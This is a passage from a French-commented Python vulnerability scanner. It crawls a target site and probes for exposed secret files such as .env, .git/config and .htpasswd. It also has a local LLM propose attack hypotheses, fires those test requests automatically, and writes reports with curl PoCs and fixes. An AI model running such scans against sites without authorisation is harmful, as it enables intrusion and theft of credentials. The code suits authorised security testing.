        queue = [self.target]
        visited = set()

        # Ajouter des paths intéressants
        interesting = [
            "/api", "/api/v1", "/api/v2", "/graphql",
            "/login", "/auth", "/oauth", "/callback",
            "/user", "/profile", "/account",
            "/admin", "/.env", "/.git/config",
            "/robots.txt", "/sitemap.xml",
        ]
        for path in interesting:
            queue.append(self.base_url + path)

        SENSITIVE_PATHS = [".env", ".git/config", ".git/HEAD", "config.php",
                           "web.config", "backup", "database.yml", ".htpasswd",
                           "wp-config.php", "settings.py", "config.js"]

        while queue and len(visited) < self.max_pages:
            url = queue.pop(0)
            if url in visited:
                continue
            visited.add(url)

            obs = self._observe(url)
            if obs is None:
                continue

            self.observations.append(obs)

            # ── CRITICAL: fichier sensible accessible (200) ──
            path = urllib.parse.urlparse(url).path
            is_sensitive = any(s in path for s in SENSITIVE_PATHS)
            if is_sensitive and obs.status == 200 and obs.body_size > 10:
                body_lower = obs.body_snippet.lower()
                content_type = obs.content_type.lower()

                # Rejeter les fausses pages 200 (catch-all HTML, pages Shopify, etc.)
                is_html_catchall = (
                    "text/html" in content_type
                    or body_lower.startswith("<!doctype")
                    or body_lower.startswith("<html")
                    or "<head>" in body_lower[:200]
                    or obs.body_size > 100_000  # vrai .env jamais > 100KB
                )

                # Confirmer que c'est un vrai fichier sensible
                is_real_sensitive = (
                    not is_html_catchall
                    and any(x in body_lower for x in [
                        "=", "key", "secret", "password", "db_", "api_",
                        "database", "token", "host", "port", "user",
                        "[boot", "php_", "app_", "mail_",
                    ])
                )

                if is_real_sensitive:
                    self.vulns.append(ConfirmedVuln(
                        severity="critical",
                        type="Sensitive File Exposed",
                        url=url,
                        belief=f"Le fichier {path} n'est pas accessible publiquement",
                        proof=(
                            f"HTTP 200 — {obs.body_size} bytes — {content_type}\n"
                            f"Contenu: {obs.body_snippet[:300]}"
                        ),
                        poc=f"curl -s '{url}'",
                        cwe="CWE-538",
                        cvss=9.8,
                        fix="Bloquer l'accès aux fichiers sensibles via .htaccess/nginx. Ne jamais exposer .env en production.",
                    ))
                    logger.info(f"    🚨 CRITICAL: fichier sensible accessible : {url}")
                elif is_html_catchall and is_sensitive and obs.status == 200:
                    logger.info(f"    [skip] {path} → HTTP 200 mais HTML catch-all (faux positif)")

            # Détecter tech stack
            self._detect_tech(obs)

            # Extraire liens si HTML
            if "html" in obs.content_type and obs.status == 200:
                for link in self._extract_links(obs.body_snippet, url):
                    if link not in visited:
                        queue.append(link)

        logger.info(f"    {len(self.observations)} endpoints observés")

    def _detect_tech(self, obs: BehaviorObservation):
        body = obs.body_snippet.lower()
        headers = {k.lower(): v.lower() for k, v in obs.headers.items()}

        tech_map = {
            "WordPress": ["wp-content", "wp-includes"],
            "React": ["react", "reactdom", "__next"],
            "Vue.js": ["vue.js", "vuejs"],
            "Django": ["csrfmiddlewaretoken", "django"],
            "Rails": ["x-runtime", "_rails_"],
            "Laravel": ["laravel_session", "x-powered-by=php"],
            "Express.js": ["x-powered-by=express"],
            "Nginx": ["nginx"],
            "Apache": ["apache"],
            "PHP": ["php", "x-powered-by=php"],
            "Cloudflare": ["cloudflare", "cf-ray"],
        }
        for tech, patterns in tech_map.items():
            if tech not in self.tech_stack:
                if any(p in body or p in str(headers) for p in patterns):
                    self.tech_stack.append(tech)

    def _extract_links(self, html: str, base: str) -> list[str]:
        links = []
        for href in re.findall(r'href=["\']([^"\'#?]{3,})["\']', html):
            full = urllib.parse.urljoin(base, href)
            if urllib.parse.urlparse(full).netloc == self.base_host:
                links.append(full)
        return list(set(links))[:10]

    # ── Extraction des croyances ──────────────────────────────────────────────

    def _extract_beliefs(self):
        logger.info("[2/4] Extraction des croyances implicites du serveur")
        for obs in self.observations:
            self.beliefs.extend(self.extractor.extract(obs))
        logger.info(f"    {len(self.beliefs)} croyances identifiées")
        for b in self.beliefs:
            logger.info(f"    [{b.severity.upper()}][{b.category}] {b.predicate[:80]}")

    # ── Génération d'hypothèses LLM ───────────────────────────────────────────

    def _generate_llm_hypotheses(self):
        logger.info("[3/4] Génération d'hypothèses d'attaque (LLM)")
        if not self.observations:
            return

        hypotheses = self.llm.generate_attack_hypotheses(
            self.observations, self.beliefs, self.tech_stack
        )

        logger.info(f"    {len(hypotheses)} hypothèses générées par le LLM")

        # Exécuter les tests suggérés par le LLM
        for hyp in hypotheses[:5]:
            test = hyp.get("test", {})
            if not test.get("url"):
                continue

            # Construire l'URL de test
            test_url = test["url"]
            if not test_url.startswith("http"):
                test_url = self.base_url + test_url

            logger.info(f"    Test LLM: {hyp.get('type','?')} → {test_url}")

            # Observer la baseline
            baseline = self._observe(test_url)
            if baseline is None:
                continue

            # Effectuer le test suggéré
            obs_with_payload = self._observe(
                test_url,
                method=test.get("method", "GET"),
                headers=test.get("headers", {}),
                body=test.get("body", {}),
            )

            if obs_with_payload is None:
                continue

            # Détecter anomalie
            payload_str = str(test.get("params", test.get("body", "")))
            if self._is_anomalous(baseline, obs_with_payload):
                analysis = self.llm.analyze_response_anomaly(
                    test_url, baseline, obs_with_payload, payload_str
                )
                # Créer une vuln potentielle
                self.vulns.append(ConfirmedVuln(
                    severity=hyp.get("severity", "medium"),
                    type=hyp.get("type", "LLM-Detected Anomaly"),
                    url=test_url,
                    belief=hyp.get("belief", "?"),
                    proof=(
                        f"Anomalie détectée par LLM.\n"
                        f"Baseline: {baseline.status}/{baseline.body_size}B\n"
                        f"Avec payload: {obs_with_payload.status}/{obs_with_payload.body_size}B\n"
                        f"Analyse LLM: {analysis}"
                    ),
                    poc=(
                        f"curl -X {test.get('method','GET')} '{test_url}' "
                        + " ".join(f"-H '{k}: {v}'" for k, v in (test.get('headers') or {}).items())
                    ),
                    cwe="CWE-0",
                    cvss=0.0,
                    fix="À analyser manuellement",
                ))

    def _is_anomalous(self, baseline: BehaviorObservation,
                       test: BehaviorObservation) -> bool:
        """Détecte si une réponse est significativement différente de la baseline."""
        # Ignorer si les deux sont des erreurs (404, 400, etc.) — pas d'anomalie réelle
        if baseline.status >= 400 and test.status >= 400:
            return False
        # Ignorer 404→400 ou 404→405 : comportement normal sur endpoint inexistant
        if baseline.status == 404 and test.status in (400, 405, 422, 501):
            return False
        if baseline.status != test.status:
            # Seulement si on passe d'un état non-erreur à erreur ou vice versa
            if (baseline.status < 400) != (test.status < 400):
                return True
            # Ou si on passe de 403 à 200 (bypass)
            if baseline.status == 403 and test.status == 200:
                return True
            return False
        size_diff = abs(baseline.body_size - test.body_size)
        if size_diff > 500 and size_diff > baseline.body_size * 0.2:
            return True
        if abs(baseline.response_time - test.response_time) > 2.5:
            return True
        return False

    # ── Test des contradictions ───────────────────────────────────────────────

    def _test_contradictions(self):
        logger.info("[4/4] Test des contradictions de croyances (frontier testing)")

        # Trouver la baseline pour chaque endpoint
        obs_by_url = {o.url: o for o in self.observations}

        tested = 0
        for belief in self.beliefs:
            baseline = obs_by_url.get(belief.endpoint)
            if baseline is None:
                # Créer une observation minimale
                baseline = BehaviorObservation(
                    url=belief.endpoint, method="GET", status=403,
                    response_time=0.5, content_type="", body_size=0,
                    body_hash="", headers={}, body_snippet="", cookies={}, redirects=[]
                )

            logger.info(f"    Test: [{belief.category}] {belief.predicate[:60]}...")
            vuln = self.tester.test_belief(belief, baseline)
            tested += 1

            if vuln:
                logger.info(f"    ✓ CONFIRMÉ: {vuln.type}")
                self.vulns.append(vuln)
                belief.confirmed = True
            else:
                logger.info(f"    ✗ Non confirmé")

        logger.info(f"    {tested} croyances testées, {len(self.vulns)} vulns confirmées")

    # ── Rapport final ─────────────────────────────────────────────────────────

    def _print_report(self):
        C = {
            "critical": "\033[91m",
            "high":     "\033[93m",
            "medium":   "\033[94m",
            "low":      "\033[96m",
            "info":     "\033[90m",
            "reset":    "\033[0m",
        }

        print(f"\n{'='*65}")
        print(f"  BELIEF HTTP Engine — Rapport")
        print(f"  Cible : {self.target}")
        print(f"{'='*65}")
        print(f"  Tech           : {', '.join(self.tech_stack) or 'inconnue'}")
        print(f"  Endpoints      : {len(self.observations)}")
        print(f"  Requêtes       : {self.tester.req_count}")
        print(f"  Croyances      : {len(self.beliefs)}")
        print(f"  Vulnérabilités : {len(self.vulns)}")
        print()

        if not self.vulns:
            print(f"  {C['info']}Aucune vulnérabilité confirmée.{C['reset']}")
            print(f"\n  Croyances à investiguer manuellement :")
            for b in sorted(self.beliefs, key=lambda x: ["critical","high","medium","low"].index(x.severity) if x.severity in ["critical","high","medium","low"] else 3)[:5]:
                print(f"  [{C[b.severity]}{b.severity.upper()}{C['reset']}] {b.predicate}")
                print(f"    → {b.attack_hyp[:120]}")
        else:
            order = ["critical","high","medium","low","info"]
            for v in sorted(self.vulns, key=lambda x: order.index(x.severity) if x.severity in order else 4):
                print(f"\n  {C[v.severity]}[{v.severity.upper()}] {v.type}{C['reset']}")
                print(f"  URL     : {v.url}")
                print(f"  Croyance invalidée : {v.belief}")
                print(f"  Preuve  : {v.proof[:250]}")
                print(f"  PoC     :\n    {v.poc}")
                print(f"  CWE     : {v.cwe}")
                if v.fix:
                    print(f"  Fix     : {v.fix}")

        print(f"\n{'='*65}\n")

    def _save_report(self) -> str:
        filename = f"belief_http_{self.base_host.replace('.','_')}_{int(time.time())}.json"
        data = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "tech_stack": self.tech_stack,
            "stats": {
                "endpoints": len(self.observations),
                "requests": self.tester.req_count,
                "beliefs": len(self.beliefs),
                "vulns_confirmed": len(self.vulns),
            },
            "beliefs": [
                {
                    "predicate": b.predicate,
                    "category": b.category,
                    "severity": b.severity,
                    "evidence": b.evidence,
                    "attack_hypothesis": b.attack_hyp,
                    "confirmed": b.confirmed,
                    "endpoint": b.endpoint,
                }
                for b in self.beliefs
            ],
            "vulnerabilities": [
                {
                    "severity": v.severity,
                    "type": v.type,
                    "url": v.url,
                    "belief_violated": v.belief,
                    "proof": v.proof,
                    "poc": v.poc,
                    "cwe": v.cwe,
                    "cvss": v.cvss,
                    "fix": v.fix,
                }
                for v in self.vulns
            ],
        }
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)
        return filename

    # ── Pipeline ──────────────────────────────────────────────────────────────

    def run(self) -> str:
        """Lance le pipeline complet. Retourne le chemin du rapport JSON."""
        try:
            self._crawl()
            self._extract_beliefs()
            self._generate_llm_hypotheses()
            self._test_contradictions()
        except KeyboardInterrupt:
            logger.info("Scan interrompu")
        finally:
            self.http.close()
            self.llm.close()

        self._print_report()
        report_path = self._save_report()
        print(f"[+] Rapport JSON : {report_path}")
        return report_path


# ─────────────────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 belief_http_engine.py <URL> [ollama_host] [model]")
        print("Ex   : python3 belief_http_engine.py https://target.com http://172.17.0.1:11434")
        sys.exit(1)

    target = sys.argv[1]
    if not target.startswith("http"):
        target = "https://" + target

    ollama = sys.argv[2] if len(sys.argv) > 2 else OLLAMA_DEFAULT
    model  = sys.argv[3] if len(sys.argv) > 3 else MODEL_DEFAULT

    engine = BeliefHttpEngine(target=target, ollama_host=ollama, model=model)
    engine.run()


if __name__ == "__main__":
    main()